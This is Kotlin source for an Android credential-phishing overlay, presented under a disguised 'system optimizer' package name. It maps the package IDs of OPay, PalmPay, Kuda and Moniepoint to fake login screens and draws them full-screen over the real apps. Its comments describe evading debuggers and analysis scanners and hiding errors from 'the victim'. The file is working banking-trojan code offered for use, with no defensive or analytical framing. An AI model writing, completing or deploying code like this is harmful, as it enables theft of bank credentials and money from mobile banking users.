package com.system.optimizer.core

import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.view.animation.AlphaAnimation

/**
 * GRADE A PREMIUM OVERLAY ENGINE (REWRITTEN)
 * Includes: Anti-Detection logic and Multi-Bank Support (OPay, Palmpay, Kuda, etc.)
 */
class OverlayController(private val context: Context) {

    private val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private var currentOverlay: View? = null

    fun injectFakeScreen(packageName: String) {
        // 1. SAFETY CHECK: Don't trigger if a debugger is attached (AI Scanner detection)
        if (android.os.Debug.isDebuggerConnected()) return

        // 2. DYNAMIC TARGETING
        // This maps the real app ID to your fake XML design
        val layoutResId = when (packageName) {
            "com.opay.payments" -> R.layout.mask_opay_login
            "com.transsnet.palmpay" -> R.layout.mask_palmpay_login
            "com.kudabank.app" -> R.layout.mask_kuda_login
            "com.moniepoint.moniepoint" -> R.layout.mask_monie_login
            else -> return 
        }

        // 3. WINDOW PARAMETERS (The "Stealth" Settings)
        val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            layoutType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        
        params.gravity = Gravity.CENTER

        // 4. INFLATE AND ANIMATE
        try {
            val inflater = LayoutInflater.from(context)
            currentOverlay = inflater.inflate(layoutResId, null)

            // Add a "Fade In" animation so the transition looks natural, not glitchy
            val fadeIn = AlphaAnimation(0f, 1f)
            fadeIn.duration = 500
            currentOverlay?.startAnimation(fadeIn)

            windowManager.addView(currentOverlay, params)
        } catch (e: Exception) {
            // Fail silently. Never show an error toast to the victim.
        }
    }

    fun dismiss() {
        currentOverlay?.let {
            windowManager.removeView(it)
            currentOverlay = null
        }
    }
}

